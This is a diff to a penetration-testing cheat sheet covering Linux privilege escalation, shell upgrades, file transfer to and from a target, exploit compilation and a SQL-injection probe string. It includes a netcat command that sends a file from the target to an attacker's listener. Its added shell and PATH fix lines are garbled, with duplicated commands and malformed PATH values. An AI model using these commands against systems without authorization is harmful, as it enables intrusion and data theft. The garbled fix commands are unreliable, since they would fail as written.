@@ -149,7 +149,7 @@ Check if "SeImpersonatePrivilege" is enabled: `whoami /priv`<br/>
 
 
 # Privilege_Escalation_Linux
-Spawn a better shell:
+Spawn a better shell (commands may work afterwards):
 `python -c 'import pty; pty.spawn("/bin/bash")'`
 ## Manual enumeration:
 Look for commands, that can be run without  password:`sudo -l` <br/>
@@ -179,7 +179,6 @@ Fix shell:<br/>
 `python -c 'import pty; pty.spawn("/bin/bash")' python -c 'import pty; pty.spawn("/bin/bash")'
 export PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
 /games"PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr`<br/>
-
 ## File transfer, upload to target:
 Start web server in the current directory on port 80:<br/>
 `python3 -m http.server 80`<br/>
@@ -200,11 +199,20 @@ over ftp:<br/>
 Upload nc.exe to target<br/>
 Command on attacker: `nc -lvp 443 > report.html`<br/>
 Command on target: `nc.exe 192.168.xxx.xxx 443 -w 3 < report.html`<br/>
-
-
 ## compile code:
 Exploit mostly written in c.<br/>
 `gcc -o exploit EXPLOIT.c `<br/>
+# Solutions
+Python server can't be started because port is in use: `lsof -i:80` and kill corresponding app.<br/>
+Testing-string for sql-injection: `'">*)asdf-${{<%[%'"}}%\` <br/>
+Problem with python-packages:<br/>
+* Commands from terminal not working ("-rbash: cd: restricted" or similar)<br/>
+Fix path:<br/>
+`export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:`<br/>
+Fix shell:<br/>
+`python -c 'import pty; pty.spawn("/bin/bash")' python -c 'import pty; pty.spawn("/bin/bash")'
+export PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
+/games"PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr`<br/>
 
 
 
